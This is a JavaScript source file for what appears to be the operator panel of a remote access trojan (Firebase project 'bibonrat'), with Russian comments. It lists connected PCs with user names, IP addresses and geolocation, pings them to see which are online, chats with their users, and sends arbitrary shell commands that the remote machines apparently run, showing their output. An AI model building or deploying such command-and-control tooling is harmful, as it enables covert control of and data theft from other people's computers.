// main.js
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
    getAuth,
    onAuthStateChanged,
    signInWithEmailAndPassword,
    createUserWithEmailAndPassword,
    signOut
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";

import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp,
    onSnapshot,
    query,
    orderBy,
    limit,
    doc,
    updateDoc,
    getDocs,
    setDoc
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

// ✅ ТВОЙ firebaseConfig
const firebaseConfig = {
    apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
    authDomain: "bibonrat.firebaseapp.com",
    databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "bibonrat",
    storageBucket: "bibonrat.firebasestorage.app",
    messagingSenderId: "78759159251",
    appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// ==== настройки ====
const MAX_MESSAGES = 6;
const ADMIN_NAME = "Admin";     // должно совпадать с C# (Admin)
const PING_TIMEOUT_MS = 8000;

// ---------- UI ----------
const authScreen = document.getElementById("authScreen");
const appScreen = document.getElementById("appScreen");

const emailEl = document.getElementById("email");
const passEl = document.getElementById("password");

const btnLogin = document.getElementById("btnLogin");
const btnRegister = document.getElementById("btnRegister");
const btnLogout = document.getElementById("btnLogout");
const btnRefresh = document.getElementById("btnRefresh");

const authError = document.getElementById("authError");
const meEmail = document.getElementById("meEmail");

const searchEl = document.getElementById("search");
const clientsList = document.getElementById("clientsList");

const chatStatus = document.getElementById("chatStatus");
const chatHeader = document.getElementById("chatHeader");
const chatBody = document.getElementById("chatBody");
const chatInputBar = document.getElementById("chatInput");

const chatClientName = document.getElementById("chatClientName");
const chatClientMeta = document.getElementById("chatClientMeta");
const chatClientIdPill = document.getElementById("chatClientIdPill");
const badgeOnline = document.getElementById("badgeOnline");

const fAdminOnline = document.getElementById("fAdminOnline");
const fAdminOpen = document.getElementById("fAdminOpen");
const fClientOnline = document.getElementById("fClientOnline");
const fClientOpen = document.getElementById("fClientOpen");

const btnOpenChat = document.getElementById("btnOpenChat");
const btnCloseChat = document.getElementById("btnCloseChat");

const btnPing = document.getElementById("btnPing");
const pingStatus = document.getElementById("pingStatus");

const btnPingAll = document.getElementById("btnPingAll");
const pingAllStatus = document.getElementById("pingAllStatus");

const btnCommand = document.getElementById("btnCommand");
const cmdPanel = document.getElementById("cmdPanel");
const btnCmdClose = document.getElementById("btnCmdClose");
const cmdInput = document.getElementById("cmdInput");
const btnCmdSend = document.getElementById("btnCmdSend");
const cmdOutput = document.getElementById("cmdOutput");
const cmdStatusBadge = document.getElementById("cmdStatusBadge");

const msgInput = document.getElementById("msgInput");
const btnSend = document.getElementById("btnSend");

const cmdPreset = document.getElementById("cmdPreset");


// ---------- State ----------
let pcDocs = [];
let selectedClientId = null;

let unsubscribeClients = null;
let unsubscribeChat = null;
let unsubscribeCmd = null;

let chatIsOpen = false;
let trimLock = false;

// ---------- helpers ----------
function setAuthError(msg) { if (authError) authError.textContent = msg || ""; }

function escapeHtml(str) {
    return String(str ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

function humanFirebaseError(err) {
    const code = err?.code || "";
    if (code.includes("auth/invalid-credential")) return "Неверный email или пароль.";
    if (code.includes("auth/user-not-found")) return "Пользователь не найден.";
    if (code.includes("auth/wrong-password")) return "Неверный пароль.";
    if (code.includes("auth/email-already-in-use")) return "Email уже используется.";
    if (code.includes("auth/weak-password")) return "Слабый пароль (минимум 6 символов).";
    if (code.includes("auth/invalid-email")) return "Неверный формат email.";
    return `Ошибка: ${code || err?.message || "неизвестно"}`;
}

function showAuth() {
    authScreen?.classList.remove("hidden");
    appScreen?.classList.add("hidden");
    setAuthError("");
    cleanupChatSubscription();
    cleanupClientsSubscription();
    cleanupCmdSubscription();
    selectedClientId = null;
    chatIsOpen = false;
}

function showApp(user) {
    authScreen?.classList.add("hidden");
    appScreen?.classList.remove("hidden");
    if (meEmail) meEmail.textContent = user?.email || "";
    setAuthError("");
}

function cleanupChatSubscription() {
    if (unsubscribeChat) {
        unsubscribeChat();
        unsubscribeChat = null;
    }
}
function cleanupClientsSubscription() {
    if (unsubscribeClients) {
        unsubscribeClients();
        unsubscribeClients = null;
    }
}
function cleanupCmdSubscription() {
    if (unsubscribeCmd) {
        unsubscribeCmd();
        unsubscribeCmd = null;
    }
}

function tsToDate(ts) {
    if (!ts) return null;
    if (typeof ts.toDate === "function") return ts.toDate();
    if (typeof ts.seconds === "number") return new Date(ts.seconds * 1000);
    return null;
}

const fmtTime = new Intl.DateTimeFormat("ru-RU", {
    day: "2-digit", month: "2-digit", year: "2-digit",
    hour: "2-digit", minute: "2-digit"
});

function onlineBadge(pcOnline) {
    if (pcOnline === 1) return { text: "ONLINE", cls: "ok" };
    if (pcOnline === 0) return { text: "OFFLINE", cls: "bad" };
    return { text: "UNKNOWN", cls: "warn" };
}

function randToken() {
    return (crypto?.randomUUID ? crypto.randomUUID() : String(Date.now()) + "_" + Math.random().toString(16).slice(2));
}

function nowLocalString() {
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    return `${pad(d.getDate())}.${pad(d.getMonth() + 1)}.${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

// ---------- AUTH ----------
onAuthStateChanged(auth, (user) => {
    if (user) {
        showApp(user);
        startClientsRealtime();
    } else {
        showAuth();
    }
});

btnLogin?.addEventListener("click", async () => {
    setAuthError("");
    try {
        await signInWithEmailAndPassword(auth, emailEl.value.trim(), passEl.value);
    } catch (e) {
        setAuthError(humanFirebaseError(e));
    }
});

btnRegister?.addEventListener("click", async () => {
    setAuthError("");
    try {
        await createUserWithEmailAndPassword(auth, emailEl.value.trim(), passEl.value);
    } catch (e) {
        setAuthError(humanFirebaseError(e));
    }
});

btnLogout?.addEventListener("click", async () => {
    if (selectedClientId && chatIsOpen) {
        await setAdminFlags(selectedClientId, 0).catch(() => { });
    }
    await signOut(auth);
});

// ---------- CLIENTS (realtime) ----------
btnRefresh?.addEventListener("click", () => renderClients());
searchEl?.addEventListener("input", renderClients);

function startClientsRealtime() {
    cleanupClientsSubscription();

    if (clientsList) clientsList.innerHTML = `<div class="muted" style="padding:10px;">Загрузка клиентов...</div>`;

    unsubscribeClients = onSnapshot(collection(db, "pcList"), (snap) => {
        const arr = [];
        snap.forEach((d) => arr.push({ id: d.id, ...d.data() }));

        arr.sort((a, b) => {
            const ap = (a.system?.pcName || a.id || "").toLowerCase();
            const bp = (b.system?.pcName || b.id || "").toLowerCase();
            return ap.localeCompare(bp);
        });

        pcDocs = arr;
        renderClients();

        if (selectedClientId) {
            const exists = pcDocs.some(x => x.id === selectedClientId);
            if (!exists) {
                selectClient(null);
            } else {
                renderSelectedHeader();
            }
        }
    }, (err) => {
        if (clientsList) {
            clientsList.innerHTML = `<div class="err" style="padding:10px;">Ошибка pcList: ${escapeHtml(err?.message || err)}</div>`;
        }
    });
}

function clientSearchKey(c) {
    return [
        c.id,
        c.system?.pcName,
        c.system?.userName,
        c.system?.internetIp,
        c.system?.localIp,
        c.system?.city,
        c.system?.region,
        c.system?.country
    ].filter(Boolean).join(" ").toLowerCase();
}

function renderClients() {
    if (!clientsList) return;

    const q = (searchEl?.value || "").trim().toLowerCase();
    const filtered = !q ? pcDocs : pcDocs.filter(c => clientSearchKey(c).includes(q));

    if (filtered.length === 0) {
        clientsList.innerHTML = `<div class="muted" style="padding:10px;">Ничего не найдено.</div>`;
        return;
    }

    clientsList.innerHTML = filtered.map((c) => {
        const pcName = c.system?.pcName || c.id;
        const user = c.system?.userName ? `@${c.system.userName}` : "—";
        const region = c.system?.region || c.system?.city || "—";
        const ip = c.system?.internetIp || c.system?.localIp || "—";
        const badge = onlineBadge(c.online?.pcOnline);

        return `
      <div class="clientItem ${c.id === selectedClientId ? "active" : ""}" data-id="${escapeHtml(c.id)}">
        <div class="clientTop">
          <div class="clientName">${escapeHtml(pcName)}</div>
          <span class="badge ${badge.cls}">${badge.text}</span>
        </div>
        <div class="clientMeta">
          <div><b>${escapeHtml(user)}</b> • ${escapeHtml(region)} • ${escapeHtml(c.system?.country || "—")}</div>
          <div>IP: ${escapeHtml(ip)}</div>
        </div>
      </div>
    `;
    }).join("");

    document.querySelectorAll(".clientItem").forEach((el) => {
        el.addEventListener("click", () => selectClient(el.getAttribute("data-id")));
    });
}

// ---------- OPEN/CLOSE CHAT ----------
function selectClient(id) {
    if (selectedClientId && chatIsOpen && selectedClientId !== id) {
        setAdminFlags(selectedClientId, 0).catch(() => { });
    }

    selectedClientId = id;
    chatIsOpen = false;
    cleanupChatSubscription();
    cleanupCmdSubscription();
    if (cmdPanel) cmdPanel.classList.add("hidden");
    renderClients();

    // reset ping badges
    setPingBadge("—", "");
    setPingAllBadge("—", "");

    if (!id) {
        if (chatStatus) chatStatus.textContent = "не выбран клиент";
        chatHeader?.classList.add("hidden");
        chatInputBar?.classList.add("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="hint">Выбери клиента слева, чтобы открыть чат.</div>`;
        return;
    }

    renderSelectedHeader();
    if (chatStatus) chatStatus.textContent = "нажми «Открыть чат у клиента»";
    if (chatBody) chatBody.innerHTML = `<div class="hint">Нажми <b>Открыть чат у клиента</b>, чтобы загрузить сообщения.</div>`;
    chatInputBar?.classList.add("hidden");
}

function renderSelectedHeader() {
    const client = pcDocs.find(x => x.id === selectedClientId);
    if (!client) return;

    const pcName = client?.system?.pcName || selectedClientId;
    const badge = onlineBadge(client?.online?.pcOnline);

    if (chatClientName) chatClientName.textContent = pcName;

    if (badgeOnline) {
        badgeOnline.textContent = badge.text;
        badgeOnline.className = `badge ${badge.cls}`;
    }

    if (chatClientIdPill) chatClientIdPill.textContent = `pcList/${selectedClientId}`;

    // ✅ pills из system (все данные)
    const sys = client?.system || {};
    const pills = [];
    if (sys.userName) pills.push(`<span class="pill">@${escapeHtml(sys.userName)}</span>`);
    if (sys.pcName) pills.push(`<span class="pill">PC: ${escapeHtml(sys.pcName)}</span>`);
    if (sys.region) pills.push(`<span class="pill">${escapeHtml(sys.region)}</span>`);
    if (sys.city) pills.push(`<span class="pill">${escapeHtml(sys.city)}</span>`);
    if (sys.country) pills.push(`<span class="pill">${escapeHtml(sys.country)}</span>`);
    if (sys.internetIp) pills.push(`<span class="pill">Internet IP: ${escapeHtml(sys.internetIp)}</span>`);
    if (sys.localIp) pills.push(`<span class="pill">Local IP: ${escapeHtml(sys.localIp)}</span>`);

    if (chatClientMeta) chatClientMeta.innerHTML = pills.join(" ");

    if (fAdminOnline) fAdminOnline.textContent = String(client?.adminOnline ?? 0);
    if (fAdminOpen) fAdminOpen.textContent = String(client?.adminOpen ?? 0);
    if (fClientOnline) fClientOnline.textContent = String(client?.clientOnline ?? 0);
    if (fClientOpen) fClientOpen.textContent = String(client?.clientOpen ?? 0);

    chatHeader?.classList.remove("hidden");
}

async function setAdminFlags(clientId, value01) {
    const ref = doc(db, "pcList", clientId);
    await updateDoc(ref, { adminOpen: value01, adminOnline: value01 });
}

function startChatRealtime(clientId) {
    const chatRef = collection(db, "pcList", clientId, "chatMessages");
    const q = query(chatRef, orderBy("ts", "desc"), limit(MAX_MESSAGES));

    unsubscribeChat = onSnapshot(q, (snap) => {
        const stickToBottom = isNearBottom(chatBody);

        const msgs = [];
        snap.forEach((d) => msgs.push({ id: d.id, ...d.data() }));

        msgs.reverse();
        renderMessages(msgs);

        if (stickToBottom) scrollToBottom(chatBody);
    }, (err) => {
        if (chatBody) chatBody.innerHTML = `<div class="err">Ошибка чтения чата: ${escapeHtml(err?.message || err)}</div>`;
    });
}

btnOpenChat?.addEventListener("click", async () => {
    if (!selectedClientId) return;

    if (chatStatus) chatStatus.textContent = "открываем чат…";
    try {
        await setAdminFlags(selectedClientId, 1);
        chatIsOpen = true;

        chatInputBar?.classList.remove("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="muted">Загрузка сообщений…</div>`;

        cleanupChatSubscription();
        startChatRealtime(selectedClientId);

        if (chatStatus) chatStatus.textContent = "чат открыт";
        msgInput?.focus();
    } catch (e) {
        if (chatStatus) chatStatus.textContent = "ошибка";
        alert("Не удалось открыть чат: " + (e?.message || e));
    }
});

btnCloseChat?.addEventListener("click", async () => {
    if (!selectedClientId) return;

    if (chatStatus) chatStatus.textContent = "закрываем чат…";
    try {
        await setAdminFlags(selectedClientId, 0);
        chatIsOpen = false;

        cleanupChatSubscription();
        chatInputBar?.classList.add("hidden");
        if (chatBody) chatBody.innerHTML = `<div class="hint">Чат закрыт. Нажми <b>Открыть чат у клиента</b>, чтобы продолжить.</div>`;
        if (chatStatus) chatStatus.textContent = "чат закрыт";
    } catch (e) {
        if (chatStatus) chatStatus.textContent = "ошибка";
        alert("Не удалось закрыть чат: " + (e?.message || e));
    }
});

// ---------- MESSAGES ----------
function isNearBottom(el) {
    if (!el) return true;
    const threshold = 80;
    return (el.scrollHeight - el.scrollTop - el.clientHeight) < threshold;
}
function scrollToBottom(el) {
    if (!el) return;
    el.scrollTop = el.scrollHeight;
}

function messageSide(msg) {
    if (msg.senderRole === "admin") return "me";
    if (msg.senderRole === "client") return "peer";
    const s = String(msg.sender || "").trim().toLowerCase();
    if (s === ADMIN_NAME.toLowerCase()) return "me";
    return "peer";
}

function renderMessages(msgs) {
    if (!chatBody) return;

    if (!msgs || msgs.length === 0) {
        chatBody.innerHTML = `<div class="hint">Сообщений пока нет. Напиши первое сообщение.</div>`;
        return;
    }

    chatBody.innerHTML = msgs.map((m) => {
        const sender = m.sender || "Unknown";
        const isMe = messageSide(m) === "me";
        const dt = tsToDate(m.ts);
        const time = dt ? fmtTime.format(dt) : "…";

        return `
      <div class="msgRow ${isMe ? "me" : ""}">
        <div class="bubble">
          <div class="bubbleTop">
            <span class="sender">${escapeHtml(sender)}</span>
            <span>${escapeHtml(time)}</span>
          </div>
          <div class="text">${escapeHtml(m.text || "")}</div>
        </div>
      </div>
    `;
    }).join("");
}

async function trimMessagesAsync(clientId) {
    if (trimLock) return;
    trimLock = true;

    try {
        const chatRef = collection(db, "pcList", clientId, "chatMessages");
        const snap = await getDocs(query(chatRef, orderBy("ts", "asc")));

        if (snap.size <= MAX_MESSAGES) return;

        const toDelete = snap.size - MAX_MESSAGES;
        let i = 0;
        for (const d of snap.docs) {
            if (i >= toDelete) break;
            await d.ref.delete();
            i++;
        }
    } finally {
        trimLock = false;
    }
}

async function sendMessage() {
    if (!selectedClientId || !chatIsOpen) return;

    const text = (msgInput?.value || "").trim();
    if (!text) return;

    if (msgInput) msgInput.value = "";
    msgInput?.focus();

    const chatRef = collection(db, "pcList", selectedClientId, "chatMessages");
    await addDoc(chatRef, {
        sender: ADMIN_NAME,
        senderRole: "admin",
        text,
        ts: serverTimestamp()
    });

    await trimMessagesAsync(selectedClientId);
}

btnSend?.addEventListener("click", sendMessage);
msgInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") sendMessage();
});

// ---------- PING / PONG ----------
function setPingBadge(text, cls) {
    if (!pingStatus) return;
    pingStatus.textContent = text;
    pingStatus.className = `badge ${cls || ""}`;
}
function setPingAllBadge(text, cls) {
    if (!pingAllStatus) return;
    pingAllStatus.textContent = text;
    pingAllStatus.className = `badge ${cls || ""}`;
}

function waitForPong(clientId, token, timeoutMs = PING_TIMEOUT_MS) {
    return new Promise((resolve) => {
        const ref = doc(db, "pcList", clientId);
        const t0 = Date.now();

        const unsub = onSnapshot(ref, (snap) => {
            const d = snap.data() || {};
            const online = d.online || {};
            const pong = online.pong;

            if (pong && pong === token) {
                try { unsub(); } catch { }
                resolve({ ok: true });
            } else if (Date.now() - t0 > timeoutMs) {
                try { unsub(); } catch { }
                resolve({ ok: false });
            }
        }, () => resolve({ ok: false }));

        setTimeout(() => {
            try { unsub(); } catch { }
            resolve({ ok: false });
        }, timeoutMs + 250);
    });
}

async function setPcOnlineFlag(clientId, isOnline) {
    const ref = doc(db, "pcList", clientId);
    if (isOnline) {
        await updateDoc(ref, {
            "online.pcOnline": 1,
            "online.lastOnlineAt": serverTimestamp(),
            "online.startTime": nowLocalString()
        });
    } else {
        await updateDoc(ref, {
            "online.pcOnline": 0,
            "online.lastOfflineAt": serverTimestamp(),
            "online.stopTime": nowLocalString()
        });
    }
}

async function doPing() {
    if (!selectedClientId) return;

    const token = randToken();
    setPingBadge("ping…", "wait");

    const ref = doc(db, "pcList", selectedClientId);
    await updateDoc(ref, {
        "online.ping": token,
        "online.pingAt": serverTimestamp()
    });

    const res = await waitForPong(selectedClientId, token, PING_TIMEOUT_MS);

    if (res.ok) {
        setPingBadge("pong ✅ ONLINE", "good");
        await setPcOnlineFlag(selectedClientId, true);
    } else {
        setPingBadge("нет pong ❌ OFFLINE", "bad2");
        await setPcOnlineFlag(selectedClientId, false);
    }
}

btnPing?.addEventListener("click", () => {
    doPing().catch((e) => {
        setPingBadge("ошибка ping", "bad2");
        alert("Ping error: " + (e?.message || e));
    });
});

async function pingOnePcSilent(clientId) {
    const token = randToken();
    const ref = doc(db, "pcList", clientId);

    await updateDoc(ref, {
        "online.ping": token,
        "online.pingAt": serverTimestamp()
    });

    const res = await waitForPong(clientId, token, PING_TIMEOUT_MS);
    await setPcOnlineFlag(clientId, res.ok);
    return res.ok;
}

async function pingAllClients() {
    const items = pcDocs.map(x => x.id);
    if (!items || items.length === 0) {
        setPingAllBadge("Нет элементов", "warn");
        return;
    }

    setPingAllBadge(`Пингую ${items.length}...`, "wait");

    const tasks = items.map(async (id) => {
        try {
            return await pingOnePcSilent(id);
        } catch {
            try { await setPcOnlineFlag(id, false); } catch { }
            return false;
        }
    });

    const results = await Promise.all(tasks);
    const onlineCount = results.filter(Boolean).length;

    setPingAllBadge(`Онлайн: ${onlineCount} / ${items.length}`, onlineCount > 0 ? "good" : "bad2");
}

btnPingAll?.addEventListener("click", () => {
    pingAllClients().catch((e) => {
        setPingAllBadge("Ошибка при пинге", "bad2");
        alert("PingAll error: " + (e?.message || e));
    });
});

// ---------- COMMAND PANEL ----------
function setCmdBadge(text, cls) {
    if (!cmdStatusBadge) return;
    cmdStatusBadge.textContent = text;
    cmdStatusBadge.className = `badge ${cls || ""}`;
}

function fmtCmdResult(d) {
    if (!d) return "Нет данных (документ command/current отсутствует).";

    const lines = [];
    lines.push(`status: ${d.status ?? "—"}`);
    lines.push(`id: ${d.id ?? "—"}`);
    lines.push(`cmd: ${d.cmd ?? "—"}`);
    lines.push(`worker: ${d.worker ?? "—"}`);
    lines.push(`exitCode: ${d.exitCode ?? "—"}`);

    const dt = tsToDate(d.ts);
    lines.push(`ts: ${dt ? fmtTime.format(dt) : (d.ts ? String(d.ts) : "—")}`);

    lines.push("");
    lines.push("stdout:");
    lines.push(d.stdout ? String(d.stdout) : "");
    lines.push("");
    lines.push("stderr:");
    lines.push(d.stderr ? String(d.stderr) : "");

    return lines.join("\n");
}

function startCommandRealtime(clientId) {
    cleanupCmdSubscription();

    const cmdRef = doc(db, "pcList", clientId, "command", "current");

    setCmdBadge("ожидание…", "wait");
    if (cmdOutput) cmdOutput.textContent = "Ждём данные от ПК…";

    unsubscribeCmd = onSnapshot(cmdRef, (snap) => {
        if (!snap.exists()) {
            setCmdBadge("нет данных", "warn");
            if (cmdOutput) cmdOutput.textContent = "Документ pcList/{id}/command/current не найден.";
            return;
        }

        const d = snap.data() || {};
        const status = String(d.status || "").toLowerCase();

        if (status === "done") setCmdBadge("done", "good");
        else if (status === "running") setCmdBadge("running", "wait");
        else if (status === "error") setCmdBadge("error", "bad2");
        else setCmdBadge(d.status || "—", "");

        if (cmdOutput) cmdOutput.textContent = fmtCmdResult(d);
    }, (err) => {
        setCmdBadge("ошибка", "bad2");
        if (cmdOutput) cmdOutput.textContent = "Ошибка чтения command/current: " + (err?.message || err);
    });
}

async function sendCommand(clientId, cmdText) {
    const cmdRef = doc(db, "pcList", clientId, "command", "current");
    const id = randToken();

    // ВАЖНО: клиент выполняет ТОЛЬКО если status == "new"
    await setDoc(cmdRef, {
        id,
        cmd: cmdText,
        status: "new",          // ✅ было "running" — теперь "new"
        stdout: "",
        stderr: "",
        exitCode: 0,
        ts: serverTimestamp(),
        worker: ""              // клиент сам поставит _pcKey когда начнёт выполнять
    }, { merge: true });

    return id;
}


btnCommand?.addEventListener("click", () => {
    if (!selectedClientId || !cmdPanel) return;

    cmdPanel.classList.toggle("hidden");

    if (!cmdPanel.classList.contains("hidden")) {
        startCommandRealtime(selectedClientId);
        cmdInput?.focus();
    } else {
        cleanupCmdSubscription();
    }
});

btnCmdClose?.addEventListener("click", () => {
    cmdPanel?.classList.add("hidden");
    cleanupCmdSubscription();
});

btnCmdSend?.addEventListener("click", async () => {
    if (!selectedClientId) return;
    const text = (cmdInput?.value || "").trim();
    if (!text) return;

    try {
        setCmdBadge("отправка…", "wait");
        await sendCommand(selectedClientId, text);
        if (cmdInput) cmdInput.value = "";
        setCmdBadge("отправлено", "wait");
    } catch (e) {
        setCmdBadge("ошибка", "bad2");
        alert("Command send error: " + (e?.message || e));
    }
});

cmdInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        btnCmdSend?.click();
    }
});

cmdPreset?.addEventListener("change", () => {
    const v = (cmdPreset.value || "").trim();
    if (!v) return;

    if (cmdInput) {
        cmdInput.value = v;
        cmdInput.focus();
        // курсор в конец
        cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
    }

    // вернуть select на "Шаблоны…"
    cmdPreset.value = "";
});

